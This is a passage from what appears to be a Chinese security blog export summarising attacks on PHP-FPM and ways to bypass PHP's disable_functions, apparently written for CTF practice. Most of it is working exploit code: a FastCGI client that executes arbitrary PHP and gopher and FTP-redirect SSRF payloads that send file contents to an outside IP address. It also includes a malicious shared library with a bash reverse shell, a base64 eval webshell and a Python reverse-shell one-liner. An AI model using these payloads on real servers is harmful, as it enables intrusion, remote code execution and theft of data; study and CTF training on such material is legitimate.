timeout, keepalive):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        if keepalive:\n            self.keepalive = 1\n        else:\n            self.keepalive = 0\n        self.sock = None\n        self.requests = dict()\n\n    def __connect(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.settimeout(self.timeout)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        # if self.keepalive:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n        # else:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n        try:\n            self.sock.connect((self.host, int(self.port)))\n        except socket.error as msg:\n            self.sock.close()\n            self.sock = None\n            print(repr(msg))\n            return False\n        return True\n\n    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n        length = len(content)\n        buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n               + bchr(fcgi_type) \\\n               + bchr((requestid >> 8) & 0xFF) \\\n               + bchr(requestid & 0xFF) \\\n               + bchr((length >> 8) & 0xFF) \\\n               + bchr(length & 0xFF) \\\n               + bchr(0) \\\n               + bchr(0) \\\n               + content\n        return buf\n\n    def __encodeNameValueParams(self, name, value):\n        nLen = len(name)\n        vLen = len(value)\n        record = b''\n        if nLen < 128:\n            record += bchr(nLen)\n        else:\n            record += bchr((nLen >> 24) | 0x80) \\\n                      + bchr((nLen >> 16) & 0xFF) \\\n                      + bchr((nLen >> 8) & 0xFF) \\\n                      + bchr(nLen & 0xFF)\n        if vLen < 128:\n            record += bchr(vLen)\n        else:\n            record += bchr((vLen >> 24) | 0x80) \\\n                      + bchr((vLen >> 16) & 0xFF) \\\n                      + bchr((vLen >> 8) & 0xFF) \\\n                      + bchr(vLen & 0xFF)\n        return record + name + value\n\n    def __decodeFastCGIHeader(self, stream):\n        header = dict()\n        header['version'] = bord(stream[0])\n        header['type'] = bord(stream[1])\n        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])\n        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])\n        header['paddingLength'] = bord(stream[6])\n        header['reserved'] = bord(stream[7])\n        return header\n\n    def __decodeFastCGIRecord(self, buffer):\n        header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n\n        if not header:\n            return False\n        else:\n            record = self.__decodeFastCGIHeader(header)\n            record['content'] = b''\n            \n            if 'contentLength' in record.keys():\n                contentLength = int(record['contentLength'])\n                record['content'] += buffer.read(contentLength)\n            if 'paddingLength' in record.keys():\n                skiped = buffer.read(int(record['paddingLength']))\n            return record\n\n    def request(self, nameValuePairs={}, post=''):\n        if not self.__connect():\n            print('connect failure! please check your fasctcgi-server !!')\n            return\n\n        requestId = random.randint(1, (1 << 16) - 1)\n        self.requests[requestId] = dict()\n        request = b\"\"\n        beginFCGIRecordContent = bchr(0) \\\n                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                 + bchr(self.keepalive) \\\n                                 + bchr(0) * 5\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                              beginFCGIRecordContent, requestId)\n        paramsRecord = b''\n        if nameValuePairs:\n            for (name, value) in nameValuePairs.items():\n                name = force_bytes(name)\n                value = force_bytes(value)\n                paramsRecord += self.__encodeNameValueParams(name, value)\n\n        if paramsRecord:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n\n        if post:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n\n        self.sock.send(request)\n        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n        self.requests[requestId]['response'] = b''\n        return self.__waitForResponse(requestId)\n\n    def __waitForResponse(self, requestId):\n        data = b''\n        while True:\n            buf = self.sock.recv(512)\n            if not len(buf):\n                break\n            data += buf\n\n        data = BytesIO(data)\n        while True:\n            response = self.__decodeFastCGIRecord(data)\n            if not response:\n                break\n            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n                if requestId == int(response['requestId']):\n                    self.requests[requestId]['response'] += response['content']\n            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n                self.requests[requestId]\n        return self.requests[requestId]['response']\n\n    def __repr__(self):\n        return \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\n    parser.add_argument('host', help='Target host, such as 127.0.0.1')\n    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\n    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')\n    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\n\n    args = parser.parse_args()\n\n    client = FastCGIClient(args.host, args.port, 3, 0)\n    params = dict()\n    documentRoot = \"/\"\n    uri = args.file\n    content = args.code\n    params = {\n        'GATEWAY_INTERFACE': 'FastCGI/1.0',\n        'REQUEST_METHOD': 'POST',\n        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n        'SCRIPT_NAME': uri,\n        'QUERY_STRING': '',\n        'REQUEST_URI': uri,\n        'DOCUMENT_ROOT': documentRoot,\n        'SERVER_SOFTWARE': 'php/fcgiclient',\n        'REMOTE_ADDR': '127.0.0.1',\n        'REMOTE_PORT': '9985',\n        'SERVER_ADDR': '127.0.0.1',\n        'SERVER_PORT': '80',\n        'SERVER_NAME': \"localhost\",\n        'SERVER_PROTOCOL': 'HTTP/1.1',\n        'CONTENT_TYPE': 'application/text',\n        'CONTENT_LENGTH': \"%d\" % len(content),\n        'PHP_VALUE': 'auto_prepend_file = php://input',\n        'PHP_ADMIN_VALUE': 'allow_url_include = On'\n    }\n    response = client.request(params, content)\n    print(force_text(response))\n```\n\n```\npython fpm.py pwn.challenge.ctf.show -p 28230 /var/www/html/index.php -c \"<?php system('ls /'); exit();?>\"\n```\n\n其中有一点需要注意，FPM在某版本后配置文件添加了`security.limit_extensions`选项，用于指定解析文件的后缀，并且默认值为.php，所以需要传入一个真实存在的php文件，否则会返回`Access denied.`或`File not found.`\n\n\n不过服务器上通常会存在一些php文件，可以用`find / -name \"*.php\"`来查找\n\n\n\n\n\n## bypass-error_log\n\n一般的攻击都是通过 auto_prepend_file ， auto_append_file 或者 extension 实现的\n\n```php\nif(preg_match('/usr|auto|extension|dir/i', $data)){\n    die('error');\n}\n```\n\n当部分内容被禁用时，就需要在php的设置中找到可以执行代码，或者包含文件，或者写文件的配置\n\n\n其中 error_log 这个配置可以保存php的报错信息，并写入到文件中，但是会被实体编码，可以通过 html_errors 设置是否实体编码\n\n`'PHP_VALUE': 'html_errors = Off\\nerror_log = /var/www/html/1.php',`\n\n但是需要注意需要和有返回报错信息的函数互相配合使用，比如 fsockopen 函数\n\n\n## bypass-内存马\n\n`'PHP_ADMIN_VALUE': 'allow_url_include = On\\nauto_prepend_file = \"data://text/plain;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\"'`\n\n\n# 通过FTP攻击php-fpm\n\n有的时候php-fpm并没有绑定在0.0.0.0上，而是127.0.0.1或其他地址，这个时候就需要通过ssrf来攻击php-fpm\n\n\n\n## file_put_contents\n\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n\n$file = $_GET['file'];\n$content = $_GET['content'];\n\nfile_put_contents($file, $content);\n```\n\n\n在上面的例子中，一般是可以写入shell的，但是在不能写入文件的情况下呢？\n\n看file_put_contents在php手册中的定义\n\n```php\nfile_put_contents\n\n(PHP 5, PHP 7, PHP 8)\nfile_put_contents — 将数据写入文件\n\n\nfile_put_contents(\n    string $filename,\n    mixed $data,\n    int $flags = 0,\n    ?resource $context = null\n): int|false\n\n和依次调用 fopen()，fwrite() 以及 fclose() 功能一样。\n```\n\n首先调用了`fopen()`，而fopen可以打开文件或者 URL ，其中包括了`ftp://`协议\n\n在ftp中，分为主动模式和被动模式。简单来说，主动模式是服务端的20端口去连接客户端的指定端口，被动模式是客户端连接服务端的指定端口。其中的区别就是在哪一端开放端口\n\n既然这样，那我们可以模拟一个被动模式的ftp客户端，指定ip端口为`127.0.0.1:9000`，这样file_put_contents就会把数据包原封不动的传递给php-fpm，实现ssrf攻击fpm\n\n\n模拟ftp的python脚本\n\n```python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('0.0.0.0',5566))\ns.listen(1)\nconn, addr = s.accept()\nconn.send(b'220 welcome\\n')\n#Service ready for new user.\n#Client send anonymous username\n#USER anonymous\nconn.send(b'331 Please specify the password.\\n')\n#User name okay, need password.\n#Client send anonymous password.\n#PASS anonymous\nconn.send(b'230 Login successful.\\n')\n#User logged in, proceed. Logged out if appropriate.\n#TYPE I\nconn.send(b'200 Switching to Binary mode.\\n')\n#Size /\nconn.send(b'550 Could not get the file size.\\n')\n#EPSV (1)\nconn.send(b'150 ok\\n')\n#PASV\nconn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n') #STOR / (2)\nconn.send(b'150 Permission denied.\\n')\n#QUIT\nconn.send(b'221 Goodbye.\\n')\nconn.close()\n```\n\n通过Gopherus构造恶意payload\n\n```bash\nroot@lewiserii:~/Gopherus-master# python2 gopherus.py --exploit fastcgi\n\n\n  ________              .__\n /  _____/  ____ ______ |  |__   ___________ __ __  ______\n/   \\  ___ /  _ \\\\____ \\|  |  \\_/ __ \\_  __ \\  |  \\/  ___/\n\\    \\_\\  (  <_> )  |_> >   Y  \\  ___/|  | \\/  |  /\\___ \\\n \\______  /\\____/|   __/|___|  /\\___  >__|  |____//____  >\n        \\/       |__|        \\/     \\/                 \\/\n\n                author: $_SpyD3r_$\n\nGive one file name which should be surely present in the server (prefer .php file)\nif you don't know press ENTER we have default one:  index.php\nTerminal command to run:  curl http://47.99.77.52:5588/?a=`cat /f*`\n\nYour gopher link is ready to do SSRF:\n\ngopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\n\n-----------Made-by-SpyD3r-----------\n```\n\npayload：\n\n注意ftp协议的格式\n\n```\n/?file=ftp://47.99.77.52:5566/test&content=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\n```\n\n监听端口即可\n\n```bash\nroot@dr0n1:~# nc -lvvnp 5588\nListening on 0.0.0.0 5588\nConnection received on 124.223.158.81 33340\nGET /?a=ctfshowd99cc801-ca48-4632-9cec-c87db8594278 HTTP/1.1\nHost: 47.99.77.52:5588\nUser-Agent: curl/7.61.1\nAccept: */*\n\n\n```\n\nFTP 仅起到了一个重定向 Payload 内容的作用\n\n![](/img/summary/php-fpm-1.png)\n\n\n\n## file_get_contents\n\n```php\n<?php\n$contents = file_get_contents($_GET['viewFile']);\nfile_put_contents($_GET['viewFile'], $contents);\n```\n\n原理与上面是一样的，只不过将发送payload和重定向都放在了ftp上\n\n第一次连接的时候返回通过Gopherus构造的payload，第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000\n\n使用的时候注意修改payload和第一次返回的ip(第53行)\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2021/1/13 6:56 下午\n# @Author  : tntaxin\n# @File    : ftp_redirect.py\n# @Software:\n\nimport socket\nfrom urllib.parse import unquote\n\n# 替换gopherus生成的payload\npayload = unquote(\"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0C%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\")\npayload = payload.encode('utf-8')\n\nhost = '0.0.0.0'\nport = 5566  # 访问端口\nsk = socket.socket()\nsk.bind((host, port))\nsk.listen(5)\n\n# ftp被动模式\nsk2 = socket.socket()\nsk2.bind((host, 5567))  # 二次访问端口\nsk2.listen()\n\n# 计数器，用于区分是第几次ftp连接\ncount = 1\nwhile 1:\n    conn, address = sk.accept()\n    conn.send(b\"200 \\n\")\n    print(conn.recv(20))  # USER aaa\\r\\n  客户端传来用户名\n    if count == 1:\n        conn.send(b\"220 ready\\n\")\n    else:\n        conn.send(b\"200 ready\\n\")\n\n    print(conn.recv(20))   # TYPE I\\r\\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本\n    if count == 1:\n        conn.send(b\"215 \\n\")\n    else:\n        conn.send(b\"200 \\n\")\n\n    print(conn.recv(20))  # SIZE /123\\r\\n  客户端询问文件/123的大小\n    if count == 1:\n        conn.send(b\"213 3 \\n\")\n    else:\n        conn.send(b\"300 \\n\")\n\n    print(conn.recv(20))  # EPSV\\r\\n'\n    conn.send(b\"200 \\n\")\n\n    print(conn.recv(20))   # PASV\\r\\n  客户端告诉服务端进入被动连接模式\n    if count == 1:\n        conn.send(b\"227 47,99,77,52,0,5567\\n\")  # vps第二次访问的ip和端口，与上面对应，注意是逗号分割\n    else:\n        conn.send(b\"227 127,0,0,1,0,9000\\n\")  # 重定向到9000\n\n    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\\r\\n，第二次连接会收到STOR /123\\r\\n\n    if count == 1:\n        conn.send(b\"125 \\n\") # 告诉客户端可以开始数据链接了\n        # 新建一个socket给服务端返回我们的payload\n        print(\"建立连接!\")\n        conn2, address2 = sk2.accept()\n        conn2.send(payload)\n        conn2.close()\n        print(\"断开连接!\")\n    else:\n        conn.send(b\"150 \\n\")\n        print(conn.recv(20))\n        exit()\n\n    # 第一次连接是下载文件，需要告诉客户端下载已经结束\n    if count == 1:\n        conn.send(b\"226 \\n\")\n    conn.close()\n    count += 1\n```\n\n发送payload\n\n`?viewFile=ftp://47.99.77.52:5566/test`\n\n正常的输出应该如下，有第二次建立连接的过程\n\n```bash\nb'USER anonymous\\r\\n'\nb'TYPE I\\r\\n'\nb'SIZE /test\\r\\n'\nb'EPSV\\r\\n'\nb'PASV\\r\\n'\nb'RETR /test\\r\\n'\n建立连接!\n断开连接!\nb'USER anonymous\\r\\n'\nb'TYPE I\\r\\n'\nb'SIZE /test\\r\\n'\nb'EPSV\\r\\n'\nb'PASV\\r\\n'\nb'STOR /test\\r\\n'\n```\n\n\n\n\n\n# 攻击unix套接字模式下的php-fpm\n\n以上的所有方法都是基于TCP通信方式进行攻击的。但是在php-fpm中还有一种unix domain socket通信方式，它是unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了\n\n一般来说这种通信方式不能进行ssrf，因为没有经过网络协议层\n\n\n\n\n## 加载so绕过disable_functions\n\n>两种通信方式都能使用此方法绕过\n\n在CTF或者渗透测试中经常会遇到目标环境设置了 disable_functions 的情况，但是 PHP_ADMIN_VALUE 不可以设置 disable_functions ，因为这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中\n\n\n但是我们可以参考 LD_PRELOAD 绕过的方式，上传一个恶意so文件，然后通过 PHP_VALUE 给 php.ini 添加一个 extender 扩展\n\n\n制作恶意so文件\n\n```c\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <string.h>\n\nextern char** environ;\n__attribute__ ((__constructor__)) void preload (void)\n{\n    int i;\n    for (i = 0; environ[i]; ++i) {\n            if (strstr(environ[i], \"LD_PRELOAD\")) {\n                    environ[i][0] = '\\0';\n            }\n    }\n    system(\"bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'\");\n}\n```\n\n编译\n\n`gcc -c -fPIC hack.c -o hack && gcc --share hack -o hack.so`\n\n以下是修改过的 [https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)，可以生成payload，注意修改 PHP_VALUE 的内容\n\n```python\nimport socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\n\n# 修改点 1\nfrom urllib.parse import quote\n\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\n\nPY2 = True if sys.version_info.major == 2 else False\n\n\ndef bchr(i):\n    if PY2:\n        return force_bytes(chr(i))\n    else:\n        return bytes([i])\n\n\ndef bord(c):\n    if isinstance(c, int):\n        return c\n    else:\n        return ord(c)\n\n\ndef force_bytes(s):\n    if isinstance(s, bytes):\n        return s\n    else:\n        return s.encode('utf-8', 'strict')\n\n\ndef force_text(s):\n    if issubclass(type(s), str):\n        return s\n    if isinstance(s, bytes):\n        s = str(s, 'utf-8', 'strict')\n    else:\n        s = str(s)\n    return s\n\n\nclass FastCGIClient:\n    \"\"\"A Fast-CGI Client for Python\"\"\"\n\n    # private\n    __FCGI_VERSION = 1\n\n    __FCGI_ROLE_RESPONDER = 1\n    __FCGI_ROLE_AUTHORIZER = 2\n    __FCGI_ROLE_FILTER = 3\n\n    __FCGI_TYPE_BEGIN = 1\n    __FCGI_TYPE_ABORT = 2\n    __FCGI_TYPE_END = 3\n    __FCGI_TYPE_PARAMS = 4\n    __FCGI_TYPE_STDIN = 5\n    __FCGI_TYPE_STDOUT = 6\n    __FCGI_TYPE_STDERR = 7\n    __FCGI_TYPE_DATA = 8\n    __FCGI_TYPE_GETVALUES = 9\n    __FCGI_TYPE_GETVALUES_RESULT = 10\n    __FCGI_TYPE_UNKOWNTYPE = 11\n\n    __FCGI_HEADER_SIZE = 8\n\n    # request state\n    FCGI_STATE_SEND = 1\n    FCGI_STATE_ERROR = 2\n    FCGI_STATE_SUCCESS = 3\n\n    def __init__(self, host, port, timeout, keepalive):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        if keepalive:\n            self.keepalive = 1\n        else:\n            self.keepalive = 0\n        self.sock = None\n        self.requests = dict()\n\n    def __connect(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.settimeout(self.timeout)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        # if self.keepalive:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n        # else:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n\n        # 修改点 2\n        # try:\n        #     self.sock.connect((self.host, int(self.port)))\n        # except socket.error as msg:\n        #     self.sock.close()\n        #     self.sock = None\n        #     print(repr(msg))\n        #     return False\n        return True\n\n    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n        length = len(content)\n        buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n              + bchr(fcgi_type) \\\n              + bchr((requestid >> 8) & 0xFF) \\\n              + bchr(requestid & 0xFF) \\\n              + bchr((length >> 8) & 0xFF) \\\n              + bchr(length & 0xFF) \\\n              + bchr(0) \\\n              + bchr(0) \\\n              + content\n        return buf\n\n    def __encodeNameValueParams(self, name, value):\n        nLen = len(name)\n        vLen = len(value)\n        record = b''\n        if nLen < 128:\n            record += bchr(nLen)\n        else:\n            record += bchr((nLen >> 24) | 0x80) \\\n                      + bchr((nLen >> 16) & 0xFF) \\\n                      + bchr((nLen >> 8) & 0xFF) \\\n                      + bchr(nLen & 0xFF)\n        if vLen < 128:\n            record += bchr(vLen)\n        else:\n            record += bchr((vLen >> 24) | 0x80) \\\n                      + bchr((vLen >> 16) & 0xFF) \\\n                      + bchr((vLen >> 8) & 0xFF) \\\n                      + bchr(vLen & 0xFF)\n        return record + name + value\n\n    def __decodeFastCGIHeader(self, stream):\n        header = dict()\n        header['version'] = bord(stream[0])\n        header['type'] = bord(stream[1])\n        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])\n        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])\n        header['paddingLength'] = bord(stream[6])\n        header['reserved'] = bord(stream[7])\n        return header\n\n    def __decodeFastCGIRecord(self, buffer):\n        header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n\n        if not header:\n            return False\n        else:\n            record = self.__decodeFastCGIHeader(header)\n            record['content'] = b''\n\n            if 'contentLength' in record.keys():\n                contentLength = int(record['contentLength'])\n                record['content'] += buffer.read(contentLength)\n            if 'paddingLength' in record.keys():\n                skiped = buffer.read(int(record['paddingLength']))\n            return record\n\n    def request(self, nameValuePairs={}, post=''):\n        if not self.__connect():\n            print('connect failure! please check your fasctcgi-server !!')\n            return\n\n        requestId = random.randint(1, (1 << 16) - 1)\n        self.requests[requestId] = dict()\n        request = b\"\"\n        beginFCGIRecordContent = bchr(0) \\\n                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                 + bchr(self.keepalive) \\\n                                 + bchr(0) * 5\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                              beginFCGIRecordContent, requestId)\n        paramsRecord = b''\n        if nameValuePairs:\n            for (name, value) in nameValuePairs.items():\n                name = force_bytes(name)\n                value = force_bytes(value)\n                paramsRecord += self.__encodeNameValueParams(name, value)\n\n        if paramsRecord:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n\n        if post:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n\n        # 修改点 3\n        # self.sock.send(request)\n        # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n        # self.requests[requestId]['response'] = b''\n        # return self.__waitForResponse(requestId)\n        return request\n\n    def __waitForResponse(self, requestId):\n        data = b''\n        while True:\n            buf = self.sock.recv(512)\n            if not len(buf):\n                break\n            data += buf\n\n        data = BytesIO(data)\n        while True:\n            response = self.__decodeFastCGIRecord(data)\n            if not response:\n                break\n            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n                if requestId == int(response['requestId']):\n                    self.requests[requestId]['response'] += response['content']\n            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n                self.requests[requestId]\n        return self.requests[requestId]['response']\n\n    def __repr__(self):\n        return \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\n    parser.add_argument('host', help='Target host, such as 127.0.0.1')\n    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\n    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')\n    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\n\n    args = parser.parse_args()\n\n    client = FastCGIClient(args.host, args.port, 3, 0)\n    params = dict()\n    documentRoot = \"/\"\n    uri = args.file\n    content = args.code\n    params = {\n        'GATEWAY_INTERFACE': 'FastCGI/1.0',\n        'REQUEST_METHOD': 'POST',\n        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n        'SCRIPT_NAME': uri,\n        'QUERY_STRING': '',\n        'REQUEST_URI': uri,\n        'DOCUMENT_ROOT': documentRoot,\n        'SERVER_SOFTWARE': 'php/fcgiclient',\n        'REMOTE_ADDR': '127.0.0.1',\n        'REMOTE_PORT': '9985',\n        'SERVER_ADDR': '127.0.0.1',\n        'SERVER_PORT': '80',\n        'SERVER_NAME': \"localhost\",\n        'SERVER_PROTOCOL': 'HTTP/1.1',\n        'CONTENT_TYPE': 'application/text',\n        'CONTENT_LENGTH': \"%d\" % len(content),\n        'PHP_VALUE': 'unserialize_callback_func = system\\nextension_dir = /tmp\\nextension = hack.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = ',\n        'PHP_ADMIN_VALUE': 'allow_url_include = On'\n    }\n    # 修改点 4\n    # response = client.request(params, content)\n    # print(force_text(response))\n    request_ssrf = quote(client.request(params, content))\n    print(\"gopher://127.0.0.1:\" + str(args.port) + \"/_\" + request_ssrf)\n\n```\n\n用法和原来一样\n\n`python fpm.py 127.0.0.1 -p 9001 /var/www/html/add_api.php -c \"<?php phpinfo(); ?>\"`\n\n","tags":["总结","php","中间件"],"categories":["总结"]},{"title":"绕过disable_functions的方法总结","url":"/posts/5f3ac2d3/","content":"\n# 常规函数函数绕过\n\n```php\n<?php\n//exec\necho exec('whoami');\n\n//shell_exec\necho shell_exec('whoami');\n\n//system\nsystem('whoami');\n\n//passthru\npassthru(\"whoami\");\n\n//popen\n$file = popen(\"whoami\",\"r\");pclose($file);\n\n//proc_open\n$command=\"whoami\"; $descriptorspec = array(1 => array(\"pipe\", \"w\")); $handle = proc_open($command ,$descriptorspec , $pipes); while(!feof($pipes[1])) { echo fread($pipes[1], 1024);}\n```\n\n如果安装了 pcntl 插件，则可以利用pcntl_exec来绕过\n\n```php\n#exec.php\n<?php pcntl_exec(\"/bin/bash\", array(\"/tmp/exp.sh\"));?>\n\n#/tmp/exp.sh\n#!/bin/bash\nls -l /\n```\n\n或者与python结合来反弹shell\n\n```php\n<?php pcntl_exec(\"/usr/bin/python3\",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((\"IP\",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'));\n```\n\n\n\n\n# 使用ext_skel制作恶意php扩展\n\ndisable_fuctions禁用的是php的函数，使用php扩展调用c的函数即可绕过\n\n这种利用方式的条件较为苛刻\n\n1：知道扩展目录并且目录可写（覆盖到已经引用的扩展，比如mysqli.so）\n2：能够载入php扩展（重启或者使用php命令行执行）\n3：能够调用自定义函数\n\n例如\n\n```php\n<?php\nerror_reporting(0);\n\n$action = $_GET['a'];\nswitch ($action) {\n    case 'phpinfo':\n        phpinfo();\n        break;\n\n    case 'write':\n        file_put_contents($_POST['file'],$_POST['content']);\n        break;\n\n    case 'run':\n        shell_exec(\"php -r 'ctfshow();'\");\n        break;\n\n    default:\n        highlight_file(__FILE__);\n        break;\n}\n```\n\n--------------------------\n\n>ext_skel是php源码包里自带的一个开发生成工具\n\n首先在PHP源码下的ext目录下执行\n\n`php ext_skel.php --ext backdoor --std`\n\n运行后会生成一个backdoor目录，然后修改生成的c文件的代码\n\n1. 在头部添加 stdlib.h ，例子中的23行\n2. 修改函数名，几处函数名要一致，例如37行和98行的函数名对应，这里用的是ctfshow\n3. 在自定义函数中添加system执行命令即可，例如40行\n\n\n```c\n/*\n   +----------------------------------------------------------------------+\n   | PHP Version 7                                                        |\n   +----------------------------------------------------------------------+\n   | Copyright (c) The PHP Group                                          |\n   +----------------------------------------------------------------------+\n   | This source file is subject to version 3.01 of the PHP license,      |\n   | that is bundled with this package in the file LICENSE, and is        |\n   | available through the world-wide-web at the following url:           |\n   | http://www.php.net/license/3_01.txt                                  |\n   | If you did not receive a copy of the PHP license and are 